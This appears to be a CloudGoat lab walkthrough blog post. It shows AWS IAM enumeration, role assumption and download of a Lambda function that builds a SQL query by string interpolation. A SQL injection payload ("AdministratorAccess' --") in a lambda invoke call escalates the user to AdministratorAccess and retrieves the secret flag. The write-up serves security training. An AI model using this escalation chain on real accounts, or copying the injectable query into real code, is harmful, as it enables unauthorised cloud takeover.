+++
title = 'Hands on Cloud Pentesting: 9 - Cloudgoat vulnerable_lambda'
date = 2025-07-02T18:56:23+05:30
draft = false
series = "Hands on Cloud Pentesting"
tags = ["cloud","aws"]
+++

<!--more-->

## vulnerable_lambda (Medium)

[Scenario Page](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/vulnerable_lambda/README.md)
### Description
In this scenario, you start as the 'bilbo' user. You will assume a role with more privileges, discover a lambda function that applies policies to users, and exploit a vulnerability in the function to escalate the privileges of the bilbo user in order to search for secrets.

### Scenario Goal(s)
Find the scenario's secret. (cg-secret-XXXXXX-XXXXXX)

### Solution
Start the scenario
```bash
cloudgoat create vulnerable_lambda
```

We are provided with Access key and secret access key for the user bilbo. This user has the following inline policy:
```json
// aws iam list-user-policies --user-name cg-bilbo-cgid11ohslcese --profile bilbo
{
    "PolicyNames": [
        "cg-bilbo-cgid11ohslcese-standard-user-assumer"
    ]
}
```
```json
// aws iam get-user-policy --user-name cg-bilbo-cgid11ohslcese --policy-name cg-bilbo-cgid11ohslcese-standard-user-assumer --profile bilbo
{
    "UserName": "cg-bilbo-cgid11ohslcese",
    "PolicyName": "cg-bilbo-cgid11ohslcese-standard-user-assumer",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "sts:AssumeRole",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::940877411605:role/cg-lambda-invoker*",
                "Sid": ""
            },
            {
                "Action": [
                    "iam:Get*",
                    "iam:List*",
                    "iam:SimulateCustomPolicy",
                    "iam:SimulatePrincipalPolicy"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": ""
            }
        ]
    }
}
```
This user has permission to assume the role `cg-lambda-invoker*`. Lets take a look at what this role is allowed access to.
```json
// aws iam list-role-policies --role-name cg-lambda-invoker-cgid11ohslcese --profile bilbo
{
    "PolicyNames": [
        "lambda-invoker"
    ]
}
```
```json
// aws iam get-role-policy --role-name cg-lambda-invoker-cgid11ohslcese --policy-name lambda-invoker --profile bilbo
{
    "RoleName": "cg-lambda-invoker-cgid11ohslcese",
    "PolicyName": "lambda-invoker",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "lambda:ListFunctionEventInvokeConfigs",
                    "lambda:InvokeFunction",
                    "lambda:ListTags",
                    "lambda:GetFunction",
                    "lambda:GetPolicy"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:lambda:us-east-1:1234567890:function:cgid11ohslcese-policy_applier_lambda1"
            },
            {
                "Action": [
                    "lambda:ListFunctions",
                    "iam:Get*",
                    "iam:List*",
                    "iam:SimulateCustomPolicy",
                    "iam:SimulatePrincipalPolicy"
                ],
                "Effect": "Allow",
                "Resource": "*"
            }
        ]
    }
}
```
This role allows a bunch of lambda actions, pointing us towards a lambda function which could be exploited. There also exists another role `cgid11ohslcese-policy_applier_lambda1` with the following policy attached to it.

```json
// aws iam list-role-policies --role-name cgid11ohslcese-policy_applier_lambda1 --profile bilbo
{
    "PolicyNames": [
        "policy_applier_lambda1"
    ]
}
```
```json
// aws iam get-role-policy --role-name cgid11ohslcese-policy_applier_lambda1 --policy-name policy_applier_lambda1 --profile bilbo
{
    "RoleName": "cgid11ohslcese-policy_applier_lambda1",
    "PolicyName": "policy_applier_lambda1",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "iam:AttachUserPolicy",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::1234567890:user/cg-bilbo-cgid11ohslcese"
            },
            {
                "Action": [
                    "logs:CreateLogStream",
                    "logs:PutLogEvents"
                ],
                "Effect": "Allow",
                "Resource": "arn:aws:logs:us-east-1:1234567890:log-group:/aws/lambda/cgid11ohslcese-policy_applier_lambda1:*"
            }
        ]
    }
}
```
This role can do [iam:AttachUserPolicy](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-iam-privesc.html#iamattachrolepolicy--stsassumeroleiamcreaterole--iamputuserpolicy--iamputgrouppolicy--iamputrolepolicy) on the bilbo user which means that we can make use of it to attach the Administrator policy to the bilbo user to extract the secret.

The issue is that we cannot directly assume this role as the user does not have the permission of AssumeRole on this resource, and the trust policy of this role also does not allow it.

Now we can assume the lambda-invoker role to look at the [lambda](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html) functions available.
```bash
aws sts assume-role --role-arn arn:aws:iam::1234567890:role/cg-lambda-invoker-cgid11ohslcese --role-session-name bilbo2 --profile bilbo

aws configure --profile invoker

aws configure set aws_session_token --profile invoker "....."

aws sts get-caller-identity --profile invoker
# {
#     "UserId": "AROASA4MJEJADPZX2WKJK:bilbo2",
#     "Account": "1234567890",
#     "Arn": "arn:aws:sts::1234567890:assumed-role/cg-lambda-invoker-cgid11ohslcese/bilbo2"
# }
```
Typical [lambda privesc vectors](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-lambda-privesc.html) do not seem to exist here based on the allowed actions so lets look at the available functions and if there are any bugs there.
```json
// aws lambda list-functions --profile invoker
{
    "Functions": [
        {
            "FunctionName": "cgid11ohslcese-policy_applier_lambda1",
            "FunctionArn": "arn:aws:lambda:us-east-1:1234567890:function:cgid11ohslcese-policy_applier_lambda1",
            "Runtime": "python3.9",
            "Role": "arn:aws:iam::1234567890:role/cgid11ohslcese-policy_applier_lambda1",
            "Handler": "main.handler",
            "CodeSize": 991559,
            "Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...",
            "Timeout": 3,
            "MemorySize": 128,
            ...
        }
    ]
}
```
```json
// aws lambda get-function --function-name cgid11ohslcese-policy_applier_lambda1 --profile invoker
{
    "Configuration": {
        "FunctionName": "cgid11ohslcese-policy_applier_lambda1",
        "FunctionArn": "arn:aws:lambda:us-east-1:1234567890:function:cgid11ohslcese-policy_applier_lambda1",
        "Runtime": "python3.9",
        "Role": "arn:aws:iam::1234567890:role/cgid11ohslcese-policy_applier_lambda1",
        "Handler": "main.handler",
        "CodeSize": 991559,
        "Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...",
        ...
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/1234567890/cgid11ohslcese-policy_applier_lambda1-91c7d184-f1ef-492c-883f-d0256b39128c?versionId=gG3IUtMrRvQd0V8o8aigMdIWovvSFfhk&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQDjDwp7T8LWyB6chKJRI%2FirUnYwZdDczEn0R1mteKKNbAIgLTLcvTsY7PoPeKy9dM9zrvC4FBZkJmYOcWS7Lp9MyfcqkgII5f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw3NDk2Nzg5MDI4MzkiDOfUdJDlhIYHfmHQxSrmATcgEOgxch2Gmwr0QZvtfjLjR2tmqULPhmwAa8FN6oQXdyjvR4rjUzFMBXCzMCZvVe3U4UdFpmro90nvAfKNMcDylG5nccQ1HE81ojQ45nvvPK5MKJGSWme3BIYomswVeS6e6oaaFEIVkNBgKzXW2k%2F%2B50ImtR%2FAGmzXclEuKX3oFb5npUilFFczvw1HSoQ%2BpZdkIlaNbJ5c8KMTCpYYQVEl%2BRfQ%2BlAz3E8xcTMw16ObcdPFniP7L%2B%2BH5qbOjb5zmpWWo1zOzL7yLdY5qqsXIQg5oic500SXBmW5ZjlqgV%2Bagy1XlUFQMJ%2FeksMGOo8Bv86U56owrx0iVT%2FS%2BcVrpiS6xdSHvcRSgCzF2ixsT5G2NkrSyHki76C0R6myP5r6Dpfn0gQHsqf%2BWJooSUVCt2jbH0QDXXkz9GNHvPmekg7gPbAIcAGxjuBEq6pp%2BtEsaMcQ02mPqlMqWY5HBNbo3XFa80pXg7wDWVY1ACFfaSkZQmtQknuAfVWCRUHuj9A%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20250702T141400Z&X-Amz-SignedHeaders=host&X-Amz-Expires=599&X-Amz-Credential=ASIA25DCYHY3YRKAMU36%2F20250702%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=e2309959c4b09c1dd84d95d77f4412b8b3122c7053f37e45747a286b4938a906"
    },
    "Tags": {
        "Name": "cg-cgid11ohslcese",
        "Scenario": "vulnerable-lambda",
        "Stack": "CloudGoat"
    }
}
```
This gives us the download link for the lambda function.
```bash
wget "https://prod-04-2014-tasks.s3.us-east-1.amazonaws.com/snapshots/1234567890/cgid11ohslcese-policy_applier_lambda1-91c7d184-f1ef-492c-883f-d0256b39128c?versionId=gG3IUtMrRvQd0V8o8aigMdIWovvSFfhk&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQDjDwp7T8LWyB6chKJRI%2FirUnYwZdDczEn0R1mteKKNbAIgLTLcvTsY7PoPeKy9dM9zrvC4FBZkJmYOcWS7Lp9MyfcqkgII5f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw3NDk2Nzg5MDI4MzkiDOfUdJDlhIYHfmHQxSrmATcgEOgxch2Gmwr0QZvtfjLjR2tmqULPhmwAa8FN6oQXdyjvR4rjUzFMBXCzMCZvVe3U4UdFpmro90nvAfKNMcDylG5nccQ1HE81ojQ45nvvPK5MKJGSWme3BIYomswVeS6e6oaaFEIVkNBgKzXW2k%2F%2B50ImtR%2FAGmzXclEuKX3oFb5npUilFFczvw1HSoQ%2BpZdkIlaNbJ5c8KMTCpYYQVEl%2BRfQ%2BlAz3E8xcTMw16ObcdPFniP7L%2B%2BH5qbOjb5zmpWWo1zOzL7yLdY5qqsXIQg5oic500SXBmW5ZjlqgV%2Bagy1XlUFQMJ%2FeksMGOo8Bv86U56owrx0iVT%2FS%2BcVrpiS6xdSHvcRSgCzF2ixsT5G2NkrSyHki76C0R6myP5r6Dpfn0gQHsqf%2BWJooSUVCt2jbH0QDXXkz9GNHvPmekg7gPbAIcAGxjuBEq6pp%2BtEsaMcQ02mPqlMqWY5HBNbo3XFa80pXg7wDWVY1ACFfaSkZQmtQknuAfVWCRUHuj9A%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20250702T141400Z&X-Amz-SignedHeaders=host&X-Amz-Expires=599&X-Amz-Credential=ASIA25DCYHY3YRKAMU36%2F20250702%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=e2309959c4b09c1dd84d95d77f4412b8b3122c7053f37e45747a286b4938a906" -O lambda_function.zip

unzip lambda_function.zip
```
Within the zip file we can see a few files among which is main.py:
```py
# cat main.py
import boto3
from sqlite_utils import Database

db = Database("my_database.db")
iam_client = boto3.client('iam')


# db["policies"].insert_all([
#     {"policy_name": "AmazonSNSReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AmazonRDSReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AWSLambda_ReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AmazonS3ReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AmazonGlacierReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AmazonRoute53DomainsReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AdministratorAccess", "public": 'False'}
# ])


def handler(event, context):
    target_policys = event['policy_names']
    user_name = event['user_name']
    print(f"target policys are : {target_policys}")

    for policy in target_policys:
        statement_returns_valid_policy = False
        statement = f"select policy_name from policies where policy_name='{policy}' and public='True'"
        for row in db.query(statement):
            statement_returns_valid_policy = True
            print(f"applying {row['policy_name']} to {user_name}")
            response = iam_client.attach_user_policy(
                UserName=user_name,
                PolicyArn=f"arn:aws:iam::aws:policy/{row['policy_name']}"
            )
            print("result: " + str(response['ResponseMetadata']['HTTPStatusCode']))

        if not statement_returns_valid_policy:
            invalid_policy_statement = f"{policy} is not an approved policy, please only choose from approved " \
                                       f"policies and don't cheat. :) "
            print(invalid_policy_statement)
            return invalid_policy_statement

    return "All managed policies were applied as expected."


if __name__ == "__main__":
    payload = {
        "policy_names": [
            "AmazonSNSReadOnlyAccess",
            "AWSLambda_ReadOnlyAccess"
        ],
        "user_name": "cg-bilbo-user"
    }
    print(handler(payload, 'uselessinfo'))
```
We can see in the lambda function configuration that the "Handler" is set to "main.handler" which means that the handler function given above is what is called when lambda function is invoked. The handler function takes 2 arguments, event(which is our payload containing policy_names and user_name) and context, and applies the policies as per a condition. It checks against a database whether the given policy is public or not and based on that it is applied.
![database values](image.png)
In the database it can be seen that the `AdministratorAccess` policy is not public and hence the function does not allow to apply that policy. We can check by invoking the policy using the [invoke](https://docs.aws.amazon.com/cli/latest/reference/lambda/invoke.html) api.
```bash
aws lambda invoke --function-name cgid11ohslcese-policy_applier_lambda1 --payload '{"policy_names":["AdministratorAccess"],"user_name":"cg-bilbo-cgid11ohslcese"}' test.out --profile invoker
# {
#     "StatusCode": 200,
#     "ExecutedVersion": "$LATEST"
# }
cat test.out
"AdministratorAccess is not an approved policy, please only choose from approved policies and don't cheat. :) "
```
We can exploit this check since the policy name is not sanitized and directly passed into the sql query. 
![sql injection](image-1.png)
The first query does not return anything but the second query comments out the `public = True` check and hence returns the policy name. We can use this same exploit to invoke the lambda function.
```bash
aws lambda invoke --function-name cgid11ohslcese-policy_applier_lambda1 --payload '{"policy_names":["AdministratorAccess'\'' --"],"user_name":"cg-bilbo-cgid11ohslcese"}' test.out --profile invoker
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
cat test.out
"All managed policies were applied as expected."
```
Now if we check the attached user-policies we can see that bilbo has AdministratorAccess.
![bilbo is admin now](image-2.png)

With the bilbo user we are now able to access the secrets manager and extract the secret which is the goal of this scenario.
```json
// aws secretsmanager list-secrets --profile bilbo --region us-east-1
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:cgid11ohslcese-final_flag-Rac4eR",
            "Name": "cgid11ohslcese-final_flag",
            "LastChangedDate": 1751463096.932,
            "LastAccessedDate": 1751414400.0,
            "Tags": [
                {
                    "Key": "Stack",
                    "Value": "CloudGoat"
                },
                {
                    "Key": "Name",
                    "Value": "cg-cgid11ohslcese"
                },
                {
                    "Key": "Scenario",
                    "Value": "vulnerable-lambda"
                }
            ],
            "SecretVersionsToStages": {
                "terraform-20250702133136388100000002": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": 1751463095.504
        }
    ]
}
```
```json
// aws secretsmanager get-secret-value --secret-id cgid11ohslcese-final_flag --region us-east-1 --profile bilbo
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:cgid11ohslcese-final_flag-Rac4eR",
    "Name": "cgid11ohslcese-final_flag",
    "VersionId": "terraform-20250702133136388100000002",
    "SecretString": "cg-secret-846237-284529",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1751463096.926
}
```

Stop the scenario
```bash
cloudgoat destroy vulnerable_lambda
```
